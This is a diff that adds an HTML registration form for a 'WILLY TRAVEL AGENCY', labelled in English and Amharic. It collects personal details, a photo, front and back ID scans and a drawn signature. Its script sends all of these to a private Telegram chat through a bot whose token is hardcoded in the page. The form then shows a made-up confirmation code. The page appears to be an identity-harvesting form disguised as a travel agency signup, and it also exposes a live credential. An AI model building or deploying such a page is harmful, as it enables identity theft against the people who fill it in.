@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>WILLY TRAVEL AGENCY - Mobile Form</title>
+
+<style>
+  :root{--accent:#0a8d34;--danger:#e63939;}
+
+  body{
+    font-family:Arial,Helvetica,sans-serif;
+    background:#f2f2f2;
+    margin:0;padding:12px;
+  }
+
+  .container{
+    max-width:760px;margin:auto;background:#fff;
+    padding:14px;border-radius:10px;
+    box-shadow:0 6px 20px rgba(0,0,0,.08);
+  }
+
+  .flag{display:block;margin:6px auto;width:110px}
+  h1{text-align:center;margin:6px 0;font-size:20px;font-weight:700}
+
+  label{font-weight:700;margin-top:8px;display:block}
+  input,select,button{
+    font-size:16px;padding:10px;
+    border-radius:8px;border:1px solid #cfcfcf;
+    box-sizing:border-box;
+  }
+
+  .row{display:flex;gap:10px;flex-direction:column}
+  @media(min-width:640px){.row.two{flex-direction:row}}
+
+  .img-preview{
+    width:100%;max-width:220px;height:160px;
+    object-fit:cover;border:1px solid #ddd;border-radius:6px;margin-top:6px
+  }
+
+  .section{
+    background:#f7f7f7;padding:8px;
+    border-radius:6px;margin-top:14px;font-weight:700
+  }
+
+  canvas{
+    width:100%;height:200px;border:2px solid #333;
+    border-radius:6px;touch-action:none;background:#fff;display:block
+  }
+
+  .controls{display:flex;gap:8px;margin-top:8px}
+  .controls button{flex:1}
+
+  .btn-primary{background:var(--accent);color:#fff;border:none}
+  .btn-clear{background:var(--danger);color:#fff;border:none}
+  .small-note{font-size:13px;color:#666;margin-top:6px}
+
+  /* ===== POPUP ===== */
+  #popupOverlay{
+    position:fixed;top:0;left:0;width:100%;height:100%;
+    background:rgba(0,0,0,.65);
+    display:none;align-items:center;justify-content:center;
+    z-index:999;
+  }
+
+  #popupBox{
+    width:86%;max-width:360px;background:#fff;border-radius:14px;
+    padding:20px;text-align:center;
+    animation:popScale .4s ease;
+  }
+
+  @keyframes popScale{
+    0%{transform:scale(0.5);opacity:0}
+    100%{transform:scale(1);opacity:1}
+  }
+
+  .popup-title{
+    font-size:20px;font-weight:700;color:#0a8d34;
+    margin-bottom:10px;
+  }
+
+  .popup-code{
+    font-size:24px;font-weight:800;color:#004aad;
+    margin:10px 0;
+    animation:codeGlow 1.2s infinite alternate;
+  }
+
+  @keyframes codeGlow{
+    from{opacity:0.5;transform:scale(1)}
+    to{opacity:1;transform:scale(1.08)}
+  }
+
+  #closePopup{
+    margin-top:14px;background:#0a8d34;color:#fff;
+    padding:10px 20px;border-radius:8px;border:none;
+    font-size:16px;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">
+
+  <h1>WILLY TRAVEL AGENCY</h1>
+
+  <div class="row two">
+    <div style="flex:1">
+      <label>ፎቶ አስገባ / Upload Photo</label>
+      <input type="file" accept="image/*" id="photoInput">
+      <img id="photoPreview" class="img-preview" style="display:none">
+    </div>
+
+    <div style="width:160px">
+      <label>ቀን / Date</label>
+      <input type="date" id="dateInput">
+    </div>
+  </div>
+
+  <!-- Identity Section -->
+  <div class="section">Identity of Registrant</div>
+
+  <label>ሙሉ ስም / FULL NAME</label><input id="fullName">
+  <label>ፆታ / SEX</label>
+  <select id="sex"><option>Male</option><option>Female</option></select>
+  <label>እድሜ / AGE</label><input id="age" type="number">
+  <label>ስልክ ቁጥር / PHONE</label><input id="phone">
+  <label>አድራሻ / ADDRESS</label><input id="address">
+
+  <!-- Holder -->
+  <div class="section">የተያያዥ ሰው / HOLDER NAME</div>
+  <label>ስም / NAME</label><input id="holderName">
+  <label>ስልክ / PHONE </label><input id="holderPhone">
+
+  <!-- Signature -->
+  <div class="section">Signature</div>
+  <canvas id="signaturePad"></canvas>
+  <div class="controls">
+    <button class="btn-clear" id="clearBtn">Clear</button>
+    <button class="btn-primary" id="previewBtn">Preview</button>
+  </div>
+  <img id="signaturePreview" class="img-preview" style="display:none">
+
+  <!-- ID Upload -->
+  <div class="section">ID Upload/ የመታወቂያ ያስገቡ </div>
+
+  <label>ID Front/ የፊት ገፅ </label><input type="file" accept="image/*" id="idFrontInput"><img id="idFrontPreview" class="img-preview" style="display:none">
+  <label>ID Back/የኋላ ገፅ </label><input type="file" accept="image/*" id="idBackInput"><img id="idBackPreview" class="img-preview" style="display:none">
+
+  <button id="submitBtn" class="btn-primary" style="margin-top:14px">Submit</button>
+</div>
+
+<!-- POPUP -->
+<div id="popupOverlay">
+  <div id="popupBox">
+    <div class="popup-title">🎉 በተሳካ ሁኔታ ፎረሙን ሞልተው ጨርሰዋል። WTA ብሎ የሚጀምረውን ልዩ ቁጥርዎን በማይረሳ ቦታ ፅፈው ይያዙት</div>
+    <div>Your form was received successfully.</div>
+    <div style="margin-top:10px;">Your Unique Code:</div>
+    <div id="uniqueCode" class="popup-code"></div>
+    <button id="closePopup">OK</button>
+  </div>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+
+/* Preview functions */
+function attachPreview(inputId,imgId){
+  $(inputId).addEventListener("change",()=>{
+    const f = $(inputId).files[0];
+    if(!f){ $(imgId).style.display="none"; return; }
+    $(imgId).src = URL.createObjectURL(f);
+    $(imgId).style.display="block";
+  });
+}
+attachPreview("photoInput","photoPreview");
+attachPreview("idFrontInput","idFrontPreview");
+attachPreview("idBackInput","idBackPreview");
+
+/* ======= SIGNATURE PAD ======= */
+const canvas = $("signaturePad");
+const ctx = canvas.getContext("2d");
+let drawing = false;
+
+function fitCanvas(){
+  const rect = canvas.getBoundingClientRect();
+  canvas.width = rect.width;
+  canvas.height = rect.height;
+  ctx.lineWidth = 2.5;
+  ctx.lineCap = "round";
+  ctx.strokeStyle = "#000";
+}
+fitCanvas();
+
+canvas.addEventListener("pointerdown",e=>{
+  drawing = true;
+  ctx.beginPath();
+  ctx.moveTo(e.offsetX,e.offsetY);
+});
+canvas.addEventListener("pointermove",e=>{
+  if(!drawing) return;
+  ctx.lineTo(e.offsetX,e.offsetY);
+  ctx.stroke();
+});
+canvas.addEventListener("pointerup",()=>drawing=false);
+
+$("clearBtn").onclick=()=>{
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  $("signaturePreview").style.display="none";
+};
+
+$("previewBtn").onclick=()=>{
+  $("signaturePreview").src = canvas.toDataURL();
+  $("signaturePreview").style.display="block";
+};
+
+/* ===== TELEGRAM CONFIG ===== */
+const BOT = "8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw";
+const CHAT = "8267646853";
+
+async function sendText(text){
+  return fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({ chat_id:CHAT, text })
+  });
+}
+
+async function sendPhoto(file, caption=""){
+  const fd = new FormData();
+  fd.append("chat_id",CHAT);
+  fd.append("photo",file);
+  fd.append("caption",caption);
+
+  return fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{
+    method:"POST",
+    body:fd
+  });
+}
+
+/* ===== SUBMIT FORM ===== */
+$("submitBtn").onclick = async ()=>{
+
+  const name = $("fullName").value.trim();
+  if(!name){ alert("Enter Full Name"); return; }
+
+  const code="WTA-"+(Math.floor(Math.random()*900000)+100000);
+  $("uniqueCode").innerText = code;
+  $("popupOverlay").style.display = "flex";
+
+  /* MESSAGE */
+  let msg =
+`📌 WILLY TRAVEL AGENCY - NEW SUBMISSION
+--------------------------------------
+👤 Name: ${$("fullName").value}
+⚧ Sex: ${$("sex").value}
+🎂 Age: ${$("age").value}
+📞 Phone: ${$("phone").value}
+🏠 Address: ${$("address").value}
+
+👨‍👩‍👦 Holder Name: ${$("holderName").value}
+📞 Holder Phone: ${$("holderPhone").value}
+
+🔐 UNIQUE CODE: ${code}
+`;
+
+  await sendText(msg);
+
+  /* Upload images */
+  if($("photoInput").files[0]) await sendPhoto($("photoInput").files[0],"User Photo");
+  if($("idFrontInput").files[0]) await sendPhoto($("idFrontInput").files[0],"ID Front");
+  if($("idBackInput").files[0]) await sendPhoto($("idBackInput").files[0],"ID Back");
+
+  /* Upload signature */
+  canvas.toBlob(async blob=>{
+    if(blob){ await sendPhoto(blob,"Signature"); }
+  });
+};
+
+$("closePopup").onclick = ()=>{
+  $("popupOverlay").style.display="none";
+};
+</script>
+
+</body>
+</html>
